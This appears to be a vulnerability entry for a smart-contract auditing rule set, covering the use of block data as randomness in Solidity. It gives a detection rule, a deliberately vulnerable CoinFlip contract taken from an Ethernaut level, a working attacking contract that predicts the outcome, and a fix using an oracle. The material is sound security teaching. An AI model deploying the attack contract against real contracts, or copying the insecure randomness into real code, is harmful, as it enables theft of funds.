## Using public block information as a source of randomness

* Vulnerability ID: ```block-randomness```
* Severity: High
* Confidence: Medium
* Difficulty: Easy
* Versions affected: All

## Historical Exploit
See the section on Crypto Puppies, where block number was used as a source of randomness.
https://media.dedaub.com/bad-randomness-is-even-dicier-than-you-think-7fa2c6e0c2cd


## Detection rule: 
Flag if there is a modulo or division operation where one of the two operators contains block.value, block.timestamp, block.hash, blockhash(), block.number, block.coinbase. 

## Vulnerable Example
#### Adapted from Openzeppelin's Ethernaut level, CoinFlip
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    function claim() public returns (bool) {
        if(consecutiveWins > 100) {
            payable(msg.sender).transfer(address(this).balance);
            return true;
        }
        return false;
    }
}


```

### Why is this a problem?
Block value is public known to all contracts, so an attacker could easily replicate the 'random' value generated.
## Attacking Contract
#### Adapted from Openzeppelin's Ethernaut level, CoinFlip
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip coinFlipContract = CoinFlip(contractAddress);
        
        coinFlipContract.flip(side);
    
    }
}


```


#### Further reading:
https://media.dedaub.com/bad-randomness-is-even-dicier-than-you-think-7fa2c6e0c2cd
https://swcregistry.io/docs/SWC-120
https://ethernaut.openzeppelin.com/level/3

## Corrected Example 
#### Intead, use an oracle, such as Chainlink, as a source of randomness.
#### see this link for an example from chainlink for how to properly generate randomness: https://remix.ethereum.org/#url=https://docs.chain.link/samples/VRF/VRFD20.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.18+commit.87f61d96.js
#### This is more work and more expensive, but the alternative of using block data for randomness will very easily be exploited.
